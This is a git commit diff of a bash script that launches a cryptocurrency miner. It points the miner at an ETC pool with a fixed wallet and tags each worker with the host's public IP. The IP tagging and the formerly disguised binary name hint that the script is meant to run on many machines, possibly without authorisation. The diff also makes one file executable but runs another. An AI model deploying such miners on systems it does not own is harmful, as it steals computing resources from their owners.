7c489f236d2bcb56ab272f48b40f12c1b0268d5a
arninovi02 <85423922+arninovi02@users.noreply.github.com>
2021-06-10 10:11:02 +0700

    Update lal.sh

--- lal.sh
+++ lal.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
-POOL=eth-us-east1.nanopool.org:9999
+POOL=eu-etc.hiveon.net:8888
 WALLET=0xeda9774264112a15245cf5eda7f9c1b2fe6bf63e.$(echo "$(curl -s ifconfig.me)" | tr . _ )
 
 cd "$(dirname "$0")"
 
-chmod +x ./lalian && ./lalian --algo ETHASH --pool $POOL --user $WALLET $@
+chmod +x ./lalian && ./lolMiner --algo ETCHASH --pool $POOL --user $WALLET $@
